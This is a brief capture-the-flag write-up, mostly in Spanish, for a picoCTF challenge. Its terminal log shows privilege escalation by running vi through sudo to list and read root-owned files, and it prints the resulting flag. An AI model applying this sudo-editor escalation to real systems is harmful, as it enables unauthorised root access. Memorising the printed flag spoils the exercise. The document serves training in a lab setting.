# Retos PicoCTF


## Objetivo 

Can you read files in the root file?
Additional details will be available after launching your challenge instance.
## Solución 

```
picoplayer@challenge:/$ sudo -l
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ cd challenge/
-bash: cd: challenge/: Permission denied
picoplayer@challenge:/$ sudo vi


Press ENTER or type command to continue
total 0
drwxr-xr-x   1 root   root     63 Sep 17 04:42 .
drwxr-xr-x   1 root   root     63 Sep 17 04:42 ..
-rwxr-xr-x   1 root   root      0 Sep 17 04:30 .dockerenv
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Sep 17 04:30 dev
drwxr-xr-x   1 root   root     66 Sep 17 04:30 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 300 nobody nogroup   0 Sep 17 04:30 proc
drwx------   1 root   root     22 Sep 17 04:42 root
drwxr-xr-x   1 root   root     66 Sep 17 04:34 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Sep 17 04:30 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var

Press ENTER or type command to continue
total 16
drwx------ 1 root root   22 Sep 17 04:42 .
drwxr-xr-x 1 root root   63 Sep 17 04:42 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  812 Sep 17 04:42 .viminfo

Press ENTER or type command to continue
picoCTF{uS1ng_v1m_3dit0r_f6ad392b}

Press ENTER or type command to continue

```

## Notas adicionales 

## Referencias 
